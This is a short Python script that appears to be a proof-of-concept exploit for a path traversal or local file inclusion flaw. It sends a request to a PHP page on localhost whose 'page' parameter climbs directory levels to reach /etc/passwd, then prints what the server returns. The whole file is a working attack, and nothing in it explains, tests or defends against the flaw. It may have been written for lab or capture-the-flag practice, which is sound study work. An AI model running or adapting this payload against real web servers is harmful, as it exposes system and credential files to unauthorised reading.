import requests

def main():
	response = requests.get("http://localhost:8080/index.php?page=../../../../../../../etc/passwd")
	print(response.text)

if __name__ == "__main__":
	main()